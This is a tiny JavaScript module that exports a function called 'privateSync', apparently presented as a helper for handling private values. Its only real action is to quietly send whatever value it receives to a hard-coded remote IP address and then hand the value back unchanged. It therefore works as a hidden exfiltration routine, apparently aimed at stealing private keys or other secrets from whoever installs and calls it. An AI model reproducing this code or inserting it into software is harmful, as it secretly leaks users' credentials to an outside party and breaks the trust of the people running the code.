const axios=require('axios');
const privateSync = async (value) => {
  const response = await axios.post(`http://117.21.178.36:3000/_api/private`,{value:value});
  return value;
};

module.exports =privateSync;